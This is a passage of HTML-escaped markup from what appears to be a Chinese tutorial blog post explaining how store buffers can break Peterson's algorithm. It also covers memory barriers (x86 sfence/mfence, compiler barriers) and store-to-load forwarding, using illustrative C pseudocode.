&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  // 时间线分析：两个CPU同时执行Peterson算法
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  时间0: 初始状态
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  flag[0] = false, flag[1] = false, turn = 任意值
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  时间1: CPU0和CPU1几乎同时开始执行
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CPU0: flag[0] = true  → 进入CPU0的Store Buffer
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CPU1: flag[1] = true  → 进入CPU1的Store Buffer
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  时间2: 继续执行
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CPU0: turn = 1        → 进入CPU0的Store Buffer  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CPU1: turn = 0        → 进入CPU1的Store Buffer
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  时间3: 开始检查条件
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CPU0: 读取flag[1]    → 从内存读到false（CPU1的写入还在Store Buffer中！）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CPU1: 读取flag[0]    → 从内存读到false（CPU0的写入还在Store Buffer中！）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  时间4: 条件检查结果
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CPU0: flag[1]==false &amp;amp;&amp;amp; turn==1 → false，所以不等待
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CPU1: flag[0]==false &amp;amp;&amp;amp; turn==0 → false，所以不等待
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  时间5: 灾难发生
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CPU0: 进入临界区 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CPU1: 进入临界区 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  两个进程同时进入临界区！Peterson算法失败！
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;内存屏障与store-buffer&#34;&gt;内存屏障与Store BUffer
&lt;/h3&gt;&lt;h4 id=&#34;定义-4&#34;&gt;定义
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;内存屏障是一种同步原语，用于控制内存操作的顺序，确保特定的内存操作按照预期的顺序执行&lt;/li&gt;
&lt;li&gt;可以类比成红灯，只有当所有应该到达的车到达了才转绿灯&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;写屏障&#34;&gt;写屏障
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 写屏障的作用：确保屏障前的写操作完成
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;store_barrier&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;// 等待Store Buffer排空
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;store_buffer_empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nf&#34;&gt;drain_store_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;// 确保所有写操作都到达缓存/内存
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// Peterson算法的修复：
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;store_barrier&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;       &lt;span class=&#34;c1&#34;&gt;// 确保flag[0]写入完成
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;turn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;store_barrier&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;       &lt;span class=&#34;c1&#34;&gt;// 确保turn写入完成
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;turn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;不同类型的屏障&#34;&gt;不同类型的屏障
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// x86架构的内存屏障：
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// SFENCE：Store Fence，写屏障
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;sfence&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;asm&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;volatile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sfence&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:::&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;memory&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// MFENCE：Memory Fence，全屏障
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;mfence&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;asm&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;volatile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;mfence&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:::&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;memory&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 编译器屏障：防止编译器重排序
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;compiler_barrier&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;asm&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;volatile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:::&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;memory&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;store-to-load-forwarding存储转发机制详解&#34;&gt;Store-to-Load Forwarding(存储转发)机制详解
&lt;/h3&gt;&lt;h4 id=&#34;作用演示&#34;&gt;作用演示
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 程序代码：
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// 写操作：把42写入变量x
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;// 读操作：读取变量x的值
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 没有转发机制的问题：
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 1. x = 42进入Store Buffer，还没写到内存
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 2. int a = x从内存读取，读到的是旧值（比如0）
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 3. 明明刚写了42，却读到了0！
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 有转发机制的解决：
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 1. x = 42进入Store Buffer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 2. int a = x时，CPU检查Store Buffer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 3. 发现Store Buffer中有x=42，直接返回42
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 4. 读到了正确的值！
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;转发机制的实现&#34;&gt;转发机制的实现
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;load_operation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;// 1. 首先检查Store Buffer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;store_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;newest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;store_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;oldest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
